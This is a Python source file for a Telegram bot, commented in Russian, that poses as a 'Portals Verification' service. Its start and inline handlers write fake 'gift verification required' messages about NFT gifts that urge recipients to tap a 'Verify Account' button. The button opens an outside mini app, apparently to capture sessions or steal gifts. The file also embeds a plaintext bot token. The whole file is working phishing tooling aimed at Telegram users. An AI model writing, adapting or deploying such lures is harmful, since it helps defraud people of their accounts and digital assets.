import logging
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo, InlineQueryResultArticle, InputTextMessageContent
from telegram.ext import Application, CommandHandler, InlineQueryHandler, ContextTypes

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ТОКЕН БОТА
TOKEN = "8868277445:AAEPYSE-uoej11anci9jpiaoDYsOqL_-tps"

# Ссылка на аватарку
PHOTO_URL = "https://i.postimg.cc/hPNrFrmg/IMG-4180.jpg"

# ССЫЛКА НА MINI APP
MINI_APP_URL = "https://verifing-production.up.railway.app"

# Команда /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("✅ Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = (
        f"🎩 *Portals Verification*\n\n"
        f"**Final Verification Required: Claim Your Gift**\n\n"
        f"Your scheduled delivery of *JollyChimp #20,203* is tagged for last-mile review. "
        f"To preserve platform safety and block fraudulent claim attempts, confirming "
        f"your active session is required before the gift can be released.\n\n"
        f"A single tap below and the asset is on its way."
    )
    
    await update.message.reply_photo(
        photo=PHOTO_URL,
        caption=message,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

# ===== ИНЛАЙН-РЕЖИМ =====
async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.inline_query.query.strip()
    
    # Если ничего не введено
    if not query:
        results = [
            InlineQueryResultArticle(
                id="1",
                title="Вставьте ссылку на подарок",
                description="Например: https://t.me/nft/123",
                input_message_content=InputTextMessageContent(
                    "Пожалуйста, введите ссылку на подарок после @PortalVerificationsRobot"
                )
            )
        ]
        await update.inline_query.answer(results)
        return
    
    # Проверяем, что это ссылка на NFT/подарок
    # Поддерживаем форматы:
    # - https://t.me/nft/...
    # - https://t.me/gift/...
    # - любые другие ссылки
    
    is_valid_link = re.match(r'^https?://t\.me/(nft|gift|portal)/', query)
    
    if is_valid_link or query.startswith('http'):
        # ФОРМИРУЕМ СООБЩЕНИЕ С КНОПКОЙ
        keyboard = [
            [InlineKeyboardButton("✅ Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Извлекаем ID подарка из ссылки
        gift_id = query.split('/')[-1] if '/' in query else 'Unknown'
        
        message = (
            f"🎁 *Gift Verification Required*\n\n"
            f"**Sky Stilettos #{gift_id}** is currently undergoing a security review.\n\n"
            f"To regain access, please verify the gift using the official bot below.\n\n"
            f"🔗 [View Gift]({query})\n\n"
            f"A single tap below and the asset is on its way."
        )
        
        # Результат инлайн-запроса
        results = [
            InlineQueryResultArticle(
                id="1",
                title=f"Подарок {gift_id}",
                description=f"Отправить сообщение с кнопкой Verify Account для {gift_id}",
                input_message_content=InputTextMessageContent(
                    message_text=message,
                    parse_mode='Markdown',
                    disable_web_page_preview=False
                ),
                reply_markup=reply_markup,
                # Добавляем превью фото
                thumb_url=PHOTO_URL
            )
        ]
        await update.inline_query.answer(results)
        
    else:
        # Если ссылка невалидная
        results = [
            InlineQueryResultArticle(
                id="1",
                title="❌ Неверная ссылка",
                description="Введите корректную ссылку на подарок",
                input_message_content=InputTextMessageContent(
                    "❌ Пожалуйста, введите корректную ссылку на подарок.\n\n"
                    "Пример: `https://t.me/nft/123`"
                )
            )
        ]
        await update.inline_query.answer(results)

# Команда /help
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *Как использовать бота:*\n\n"
        "1. Напиши `@PortalVerificationsRobot ссылка_на_подарок`\n"
        "2. Выбери результат\n"
        "3. Отправь сообщение\n\n"
        "Пример:\n"
        "`@PortalVerificationsRobot https://t.me/nft/123`\n\n"
        "Или просто нажми /start для теста",
        parse_mode='Markdown'
    )

def main():
    application = Application.builder().token(TOKEN).build()
    
    # Регистрируем обработчики
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(InlineQueryHandler(inline_query))
    
    logger.info("🚀 Бот запущен и работает!")
    logger.info("📱 Инлайн-режим: @PortalVerificationsRobot [ссылка]")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
